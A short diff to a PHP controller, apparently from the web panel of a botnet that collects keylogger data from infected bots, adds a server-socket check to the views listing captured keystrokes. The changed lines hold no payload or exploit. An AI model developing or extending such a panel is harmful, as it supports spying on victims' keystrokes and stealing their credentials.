@@ -3,6 +3,7 @@ include_once("../Model/Bean/Keylogger.php");
 include_once("../Model/BO/BO_Keylogger.php");
 include_once("../Model/Bean/Bot.php");
 include_once("../Model/BO/BO_Bot.php");
+include_once("../utils/checkServerOn.php");
 
 class C_Keylogger
 {
@@ -17,6 +18,7 @@ class C_Keylogger
     public function view()
     {
         session_start();
+        checkSocket();
         if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
             $id = $_REQUEST["ID"];
             $boKeylogger = new BO_Keylogger();
@@ -37,6 +39,7 @@ class C_Keylogger
     public function keyloggerDetail()
     {
         session_start();
+        checkSocket();
         if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
             $idKeylogger = $_REQUEST["IdKeylogger"];
             $idBot = $_REQUEST["IdBot"];
